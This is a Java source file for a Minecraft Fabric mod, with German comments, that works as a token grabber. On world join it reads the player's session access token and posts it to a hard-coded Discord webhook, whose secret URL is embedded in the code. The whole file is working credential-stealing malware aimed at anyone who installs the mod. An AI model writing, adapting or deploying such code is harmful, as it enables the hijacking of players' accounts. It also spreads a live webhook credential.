package com.quiqzy.modcode;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.client.event.v1.ClientPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.concurrent.CompletableFuture;

public class TokenWebhookSender implements ModInitializer {
    public static final String MOD_ID = "webhook_token_sender";
    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
    
    // Dein Webhook Link
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1564671983009009835/hSG8MaH664-iUxiQbN-GKmHLgu2322vq3P2eCe6u_ho5MQJiOwpUg7ns7KSyzENVDOmT";

    @Override
    public void onInitialize() {
        LOGGER.info("Mod Initialized");

        // Event registrieren: Wenn der Spieler eine Welt betritt
        ClientPlayConnectionEvents.JOIN.register((handler, packetSender, client) -> {
            try {
                // Token holen
                String token = client.getSession().getAccessToken();
                
                // Im Chat anzeigen (zur Kontrolle)
                if (client.player != null) {
                    client.player.sendMessage(Text.literal("Token: " + token), false);
                }

                // An Discord senden
                sendToDiscord(token);

            } catch (Exception e) {
                LOGGER.error("Error", e);
            }
        });
    }

    private void sendToDiscord(String token) {
        HttpClient client = HttpClient.newHttpClient();
        
        // JSON Body erstellen
        String json = "{\"content\": \"Neuer Token: " + escapeJson(token) + "\"}";

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(WEBHOOK_URL))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(json))
                .build();

        client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
              .thenAccept(response -> {
                  if (response.statusCode() == 204 || response.statusCode() == 200) {
                      LOGGER.info("Token erfolgreich gesendet!");
                  } else {
                      LOGGER.error("Fehler beim Senden: " + response.statusCode());
                  }
              })
              .exceptionally(ex -> {
                  LOGGER.error("HTTP Fehler", ex);
                  return null;
              });
    }

    private String escapeJson(String input) {
        return input.replace("\\", "\\\\")
                    .replace("\"", "\\\"")
                    .replace("\n", "\\n");
    }
}
